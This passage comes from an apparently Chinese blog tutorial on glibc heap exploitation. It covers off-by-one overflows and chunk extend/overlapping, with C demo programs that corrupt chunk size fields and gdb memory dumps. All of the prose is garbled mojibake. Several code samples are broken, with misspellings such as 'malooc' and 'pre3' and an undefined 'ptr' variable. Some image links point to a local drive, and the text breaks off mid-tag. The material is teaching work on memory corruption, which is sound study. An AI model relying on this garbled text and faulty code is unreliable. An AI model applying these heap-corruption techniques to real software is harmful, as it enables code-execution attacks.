ä½è¢«æ¸…ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚</p><ul><li>ä½¿ç”¨ unlink è¿›è¡Œå¤„ç†</li><li>è¿™æ—¶ <code>prev_size</code> åŸŸå°±ä¼šå¯ç”¨ï¼Œå¯ä»¥ä¼ªé€  <code>prev_size</code> ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§ <code>prev_size</code> æ‰¾åˆ°çš„å—çš„å¤§å°ä¸<code>prev_size</code> æ˜¯å¦ä¸€è‡´ã€‚</li></ul><blockquote><p>åœ¨glibc2.28åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­éƒ½æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œæœ€æ–°ç‰ˆæœ¬ä¸­å·²ç»æ·»åŠ äº†å¯¹åº”çš„æ£€æŸ¥æ–¹æ³•ã€‚</p></blockquote><h4 id="ğŸŒ°ï¼š"><a href="#ğŸŒ°ï¼š" class="headerlink" title="ğŸŒ°ï¼š"></a>ğŸŒ°ï¼š</h4><p>æ —å­1ï¼š</p><p>å¯¼è‡´ off-by-one æ¼æ´çš„ä¸€ä¸ªåŸå› å°±æ˜¯è¾“å…¥çš„è¾¹ç•Œæ£€æŸ¥ä¸æ¸…ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªæ …æ é”™è¯¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">my_gets</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr,<span class="hljs-type">int</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)<br>    &#123;<br>        ptr[i]=getchar();<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input:&quot;</span>);<br>    my_gets(chunk1,<span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚ä¸Šï¼Œæˆ‘ä»¬è‡ªå·±å†™çš„ my_gets å‡½æ•°å®é™…è¾“å…¥ size+1 ä½æ•°æ®ï¼Œé€ æˆäº† off-by-one æº¢å‡ºã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨ gdb å¯¹ç¨‹åºè¿›è¡Œè°ƒè¯•ï¼ŒæŸ¥çœ‹åœ¨è¿›è¡Œè¾“å…¥åˆ†é…çš„å †å—ä¸ºä¸¤ä¸ªåå…­å­—èŠ‚çš„å †å—ï¼š</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heap.png"></p><p>è¿ç»­è¾“å…¥17ä¸ª1ï¼Œä¼šå‘ç°è¦†ç›–åˆ°äº†ä¸‹ä¸€ä¸ª chunk çš„ <em>prev_size</em> å­—èŠ‚ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heapflow.png"></p><p>æ —å­2ï¼š</p><p>å¯¼è‡´ off-by-one çš„åœºæ™¯å°±æ˜¯å­—ç¬¦ä¸²æ“ä½œäº†ï¼Œå¸¸è§çš„åŸå› æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸç¬¦è®¡ç®—æœ‰è¯¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">void</span> *chunk1;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input&quot;</span>);<br>    gets(buffer);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)<br>    &#123;<br>        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>           <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºä¹ä¸€çœ‹æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æ³¨æ„åˆ°çš„æ˜¯ï¼Œstrlen çš„é•¿åº¦è®¡ç®—æ–¹æ³•å’Œ strcpy å¤åˆ¶æ—¶çš„é•¿åº¦æ˜¯ä¸ä¸€æ ·çš„ã€‚strlen è®¡ç®—ASCII å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå®ƒåœ¨è®¡ç®—é•¿åº¦æ—¶æ˜¯ä¸ä¼šæŠŠå­—ç¬¦ä¸²ç»“å°¾çš„ â€˜\x00â€™ è®¡ç®—åœ¨å†…çš„ï¼Œä½†æ˜¯ strcpy åœ¨å¤åˆ¶å­—ç¬¦ä¸²çš„æ—¶å€™ä¼šæ‹·è´å­—ç¬¦ä¸²çš„ç»“æŸç¬¦ â€˜\x00â€™ ã€‚è¿™å°±å¯¼è‡´æˆ‘ä»¬å®é™…ä¸Šæ˜¯å‘chunk1 ä¸­å†™å…¥äº†25å­—èŠ‚ã€‚</p><p>åœ¨strcpyå‘½ä»¤æ‰§è¡Œä¹‹å‰æˆ‘ä»¬çš„å †ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåå°±ä¼šå‘ç°å®ƒè¦†ç›–äº†ä¸‹ä¸€ä¸ªå †å—çš„ä½å­—èŠ‚ï¼ˆå°ç«¯åºï¼‰ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000400</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>ï¼ˆä¸ºä»€ä¹ˆæ²¡æœ‰æˆªå›¾ï¼Œå› ä¸ºè¿™ç©æ„æˆ‘éƒ½å¤ç°ä¸æˆåŠŸğŸ˜…ï¼‰</p><blockquote><p>è¿™ä¸ªæ¼æ´åœ¨2.29ä¹‹åå°±ä¸èƒ½åˆ©ç”¨äº†ï¼Œå› ä¸ºglibcæ›´æ–°ä»¥åå¢åŠ äº†æ£€æŸ¥çš„ä»£ç ã€‚</p></blockquote><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>è¿™ç§æ”»å‡»ç›®çš„åœ¨äºå°†ä¸€ä¸ªchunkå—çš„å¯æ§åŒºåŸŸè¡ç”Ÿåˆ°ä¸å…¶ç›¸é‚»çš„ä¸€ä¸ªæˆ–è€…å¤šä¸ªchunkå—ä¸­ã€‚é€šè¿‡è¿™ç§æ”»å‡»æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹åˆ°ä¸å±äºæœ¬chunkå—çš„å†…å®¹ã€‚é€šè¿‡ extend å¯ä»¥å®ç° chunk overlapping çš„æ•ˆæœã€‚</p><p>ä¸€èˆ¬æ¥è¯´è¿™ç§æŠ€æœ¯å¹¶ä¸èƒ½ç›´æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä½†æ˜¯å¯ä»¥æ§åˆ¶chunk ä¸­çš„å†…å®¹ã€‚å¦‚æœchunk ä¸­å­˜åœ¨å­—ç¬¦ä¸²æŒ‡é’ˆã€å‡½æ•°æŒ‡é’ˆç­‰ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›æŒ‡é’ˆæ¥è¿›ä¸€æ­¥è¿›è¡Œä¿¡æ¯æ³„éœ²å’Œç¨‹åºæ‰§è¡Œæµç¨‹ã€‚</p><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>chunk extend æŠ€æœ¯èƒ½å¤Ÿäº§ç”Ÿçš„åŸå› åœ¨äº ptmalloc åœ¨å¯¹å † chunk è¿›è¡Œæ“ä½œæ—¶ä½¿ç”¨çš„å„ç§å®ã€‚</p><ul><li><p>è·å–å½“å‰ chunk å—å¤§å°çš„æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* ä»…ç”¨æˆ·ç©ºé—´éƒ¨åˆ†çš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">//SIZE_BITS åœ¨è¿™é‡Œæ˜¯ä¸€ä¸ªä»£è¡¨å †å—å¤§å°çš„æ ‡å¿—ä½æ©ç </span><br><br><span class="hljs-comment">/* å®Œæ•´å †å—çš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure></li><li><p>è·å–ä¸‹ä¸€ä¸ª chunk å—åœ°å€çš„æ“ä½œï¼Œå³ä½¿ç”¨å½“å‰å—æŒ‡é’ˆåŠ ä¸Šå½“å‰å—å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>è·å–å‰ä¸€ä¸ª chunk å—ä¿¡æ¯çš„æ“ä½œï¼Œå…¶ä¸­å †å—åœ°å€çš„è®¡ç®—æ˜¯ç”±å½“å‰ chunk åœ°å€å‡å»å‰ä¸€ä¸ª chunk çš„å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* å‰ä¸€ä¸ªå †å—çš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* å‰ä¸€ä¸ªå †å—çš„åœ°å€  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>åˆ¤æ–­å½“å‰å †å—æ˜¯å¦è¢«ä½¿ç”¨ï¼Œå³æŸ¥çœ‹ä¸‹ä¸€ chunk çš„ prev_inuse åŸŸï¼Œè€Œä¸‹ä¸€å—åœ°å€åˆå¦‚æˆ‘ä»¬å‰é¢æ‰€è¿°æ˜¯æ ¹æ®å½“å‰ chunk çš„ size è®¡ç®—å¾—å‡ºçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure></li></ul><p>é€šè¿‡ä¸Šé¢çš„å‡ ä¸ªå®æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œ ptmalloc é€šè¿‡ chunk header çš„æ•°æ®æ¥åˆ¤æ–­ chunk çš„ä½¿ç”¨æƒ…å†µå’Œå¯¹ chunk å‰åè¿›è¡Œå®šä½ã€‚</p><p>è€Œæˆ‘ä»¬çš„ chunk extend å°±æ˜¯é€šè¿‡æ§åˆ¶ chunk header å³ size å’Œ pre_size åŸŸæ¥å®ç°è·¨è¶Šå—æ“ä½œå¯¼è‡´ overlappingã€‚</p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><h5 id="ğŸŒ°1ï¼šå¯¹-inuse-çš„-fastbin-è¿›è¡Œ-extend"><a href="#ğŸŒ°1ï¼šå¯¹-inuse-çš„-fastbin-è¿›è¡Œ-extend" class="headerlink" title="ğŸŒ°1ï¼šå¯¹ inuse çš„ fastbin è¿›è¡Œ extend"></a>ğŸŒ°1ï¼šå¯¹ inuse çš„ fastbin è¿›è¡Œ extend</h5><p>å°±æ˜¯é€šè¿‡æ›´æ”¹ç¬¬ä¸€ä¸ªå †å—çš„ä¿¡æ¯æ¥æ§åˆ¶å®ƒä¹‹åçš„å †å—çš„å†…å®¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = malooc(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;  <span class="hljs-comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    pre3 = malooc(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸¤æ¬¡ malloc åå †å—ä¸­çš„æ•°æ®æ˜¯è¿™æ ·çš„</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb1.png"></p><p>ä¿®æ”¹äº† ptr1 çš„ size ä½åå¯¹åº”å˜æˆäº† 41</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb2.png"></p><p>æˆ‘ä»¬ free æ‰å®ƒä¹‹åï¼Œ ä¹Ÿå¯¹åº”è¿›å…¥äº† 0x40 çš„ bin ä¸­</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb3.png"></p><p>æ­¤æ—¶æˆ‘ä»¬å†æ¬¡åˆ†é… 0x30 çš„å †å—å°±ä¼šæŠŠåŸæœ¬å±äº ptr2 å¤´éƒ¨çš„å†…å­˜åˆ†é…åˆ° ptr3 ä¸­ï¼Œ</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb4.png"></p><p>æ­¤æ—¶åŸæœ¬ chunk2 çš„å¤´éƒ¨æ˜¯ç°åœ¨ ptr3 çš„ç”¨æˆ·å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ§åˆ¶å…¶å†…å®¹ï¼Œè¿™ç§çŠ¶æ€å°±å«åš overlapping chunkã€‚</p><h5 id="ğŸŒ°2ï¼šå¯¹-inuse-çš„-unsortedbin-è¿›è¡Œ-extend"><a href="#ğŸŒ°2ï¼šå¯¹-inuse-çš„-unsortedbin-è¿›è¡Œ-extend" class="headerlink" title="ğŸŒ°2ï¼šå¯¹ inuse çš„ unsortedbin è¿›è¡Œ extend"></a>ğŸŒ°2ï¼šå¯¹ inuse çš„ unsortedbin è¿›è¡Œ extend</h5><p>æˆ‘ä»¬çŸ¥é“å¤„äº fastbin èŒƒå›´çš„ chunk é‡Šæ”¾åä¼šè¢«ç½®å…¥ fastbin é“¾è¡¨ä¸­ï¼Œè€Œä¸å¤„äºè¿™ä¸ªèŒƒå›´çš„ chunk è¢«é‡Šæ”¾åä¼šè¢«ç½®äº unsorted bin é“¾è¡¨ä¸­ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±ä½¿ç”¨ 0x80 æ¥åˆ†é…å †ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span><br>    <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå› ä¸ºåˆ†é…çš„ size ä¸å¤„äº fastbin çš„èŒƒå›´ï¼Œå› æ­¤åœ¨é‡Šæ”¾æ—¶å¦‚æœä¸ top chunk ç›¸è¿ä¼šå¯¼è‡´å’Œ top chunk åˆå¹¶ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦é¢å¤–åˆ†é…ä¸€ä¸ª chunkï¼ŒæŠŠé‡Šæ”¾çš„å—ä¸ top chunk éš”å¼€ã€‚</p></blockquote><p>ä¸‰æ¬¡ malloc åˆ†é…å®Œä»¥åï¼Œå†…å­˜ä¸­çš„æ•°æ®å¦‚ä¸‹ï¼š</p><p><img src="D:/ç¬”è®°/PWN/å †/ç²¾ç¾é…å›¾/unsortedextend-gdb1.png"></p><p>ä¿®æ”¹size æ•°æ®åptr1 å’Œ ptr2 åˆå¹¶ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="D:/ç¬”è®°/PWN/å †/ç²¾ç¾é…å›¾/unsortedextend-gdb2.png"></p><p>ç›¸åº”çš„ free åè¿›å…¥äº† unsorted bin</p><p><img src="D:/ç¬”è®°/PWN/å †/ç²¾ç¾é…å›¾/unsortedextend-gdb3.png"></p><p>å†æ¬¡åˆ†é…æˆ‘ä»¬å°±è¾¾åˆ°äº†overlapping chunkçš„ç›®çš„ã€‚</p><h5 id="ğŸŒ°3ï¼šå¯¹-free-çš„-unsortedbin-è¿›è¡Œ-extend"><a href="#ğŸŒ°3ï¼šå¯¹-free-çš„-unsortedbin-è¿›è¡Œ-extend" class="headerlink" title="ğŸŒ°3ï¼šå¯¹ free çš„ unsortedbin è¿›è¡Œ extend"></a>ğŸŒ°3ï¼šå¯¹ free çš„ unsortedbin è¿›è¡Œ extend</h5><blockquote><p>åœ¨ä¾‹äºŒçš„åŸºç¡€ä¸Šè¿›è¡Œï¼Œå…ˆé‡Šæ”¾ chunk ï¼Œå†ä¿®æ”¹</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‰æ¬¡ malloc ä¹‹åçš„ç»“æœå¦‚ä¸‹</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb1.png"></p><p>é‡Šæ”¾ ptr1 åï¼Œchunk è¿›å…¥ unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb2.png"></p><p>ä¿®æ”¹ size å­—æ®µ</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb3.png"></p><p>å†æ¬¡åˆ†é…ï¼Œptr2 å¤´éƒ¨è¢«åˆ†é…è¿›æ–°çš„å †å—ï¼Œæˆ‘ä»¬å°±è¿™æ ·æ§åˆ¶äº† ptr2 çš„å†…å®¹</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb4.png"></p><h5 id="ğŸŒ°4ï¼šé€šè¿‡-extend-å‘å-overlapping"><a href="#ğŸŒ°4ï¼šé€šè¿‡-extend-å‘å-overlapping" class="headerlink" title="ğŸŒ°4ï¼šé€šè¿‡ extend å‘å overlapping"></a>ğŸŒ°4ï¼šé€šè¿‡ extend å‘å overlapping</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2;<br><br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ malloc(0x50) å¯¹ extend åŒºåŸŸé‡æ–°å ä½åï¼Œå…¶ä¸­ 0x10 çš„ fastbin å—ä¾ç„¶å¯ä»¥æ­£å¸¸çš„åˆ†é…å’Œé‡Šæ”¾ï¼Œæ­¤æ—¶å·²ç»æ„æˆ overlappingï¼Œé€šè¿‡å¯¹ overlapping çš„è¿›è¡Œæ“ä½œå¯ä»¥å®ç° fastbin attackã€‚</p><p>å°±åƒä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬åœ¨ä¸¤æ¬¡freeåå¯ä»¥å‘ç°bin ä¸­å‡ºç°äº†overlappingã€‚</p><p>ç¬¬ä¸€è½®çš„ malloc ç»“æŸ</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb1.png"></p><p>ä¿®æ”¹ ptr1 çš„ size</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb2.png"></p><p>ä¸¤æ¬¡ freeï¼Œbin ä¸­å‡ºç°äº†overlappingã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb3.png"></p><p>è€Œæ¥ä¸‹æ¥çš„ä¸¤æ¬¡ malloc ï¼Œâ€œ ä¸¤å— â€ chunk ä¹Ÿè¢«ä¸€æ¬¡åˆ†é…äº†</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb4.png"></p><p><img 